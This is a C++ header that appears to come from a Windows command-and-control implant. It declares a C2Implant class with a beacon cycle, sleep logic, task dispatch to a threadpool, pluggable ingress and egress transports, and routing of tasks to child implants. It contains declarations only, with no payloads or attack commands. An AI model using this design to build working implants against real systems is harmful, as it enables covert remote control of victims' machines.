#pragma once

#include <string>
#include <map>
#include <vector>
#include <iostream>
#include <thread>
#include <chrono>
#include "data/msgpack/msgpack.h"
#include "comms/transport.h"
#include "systems/childhandler.h"
#include "comms/queues.h"
//struct ChildRoutingContext {
//    nlohmann::json task_data;
//    ChildRouteInfo route_info;
//};

struct ChildRouteContext {
    nlohmann::json task;
    std::string implant_uuid;
};

//maybe toss me in my own file?
VOID CALLBACK ChildListenerThread(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
VOID CALLBACK TaskHandler(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

class C2Implant {
public:
    // --- Instance Data (Specific to this implant) ---
    // Naming: snake_case_ for members
    std::string implant_uuid_;

    // --- comms Methods ---

    //init's everyhting for the cycle
    void init();

    //registers to server
    //int register_implant();

    // main loop
    void cycle();
    void update_transports();

    void dispatch_to_threadpool(const nlohmann::json& task);
    void dispatch_to_child_router(const nlohmann::json& task, std::string implant_uuid);

private:
    // Internal helper to wrap sleep logic
    void sleep_implant();
    void handle_tasks(const nlohmann::json& incoming);

    HANDLE h_inbox_ = INVALID_HANDLE_VALUE;
    HANDLE h_outbox_ = INVALID_HANDLE_VALUE;


    IIngressTransport* current_ingress_ = nullptr;
    IEgressTransport* current_egress_ = nullptr;

    //child tracker
    //std::unordered_map<std::string, ChildRouteInfo> connected_children_;
    //std::mutex children_mutex_;
};